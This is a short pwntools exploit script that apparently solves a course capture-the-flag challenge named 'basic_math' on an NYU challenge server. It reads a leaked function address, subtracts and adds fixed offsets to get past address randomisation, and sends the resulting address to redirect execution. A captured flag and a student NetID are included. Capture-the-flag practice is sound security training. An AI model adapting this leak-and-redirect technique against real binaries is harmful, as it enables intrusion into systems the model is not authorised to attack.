from pwn import *

# context.log_level = "DEBUG"

CHALLENGE = "basic_math"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1245
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

print(p.recvuntil(b": ").decode())
totally_uninteresting_function_addr = p.recv(8)
log.info(f"Receiving address in raw bytes: {totally_uninteresting_function_addr}")
print(p.recvuntil(b"> ").decode())
totally_uninteresting_function_addr = u64(totally_uninteresting_function_addr)
totally_uninteresting_function_offset = 0x1249
basic_math_ADD_offset = 0x1285
basic_math_ADD_addr = totally_uninteresting_function_addr - totally_uninteresting_function_offset + basic_math_ADD_offset
p.sendline(p64(basic_math_ADD_addr))
log.info(f"Sending address in raw bytes: {p64(basic_math_ADD_addr)}")

p.interactive()

# flag{R34d1ng_4ss3mbly_l4ngu4ge_w4snt_th4t_h4rd!_1e237660c13c7494}
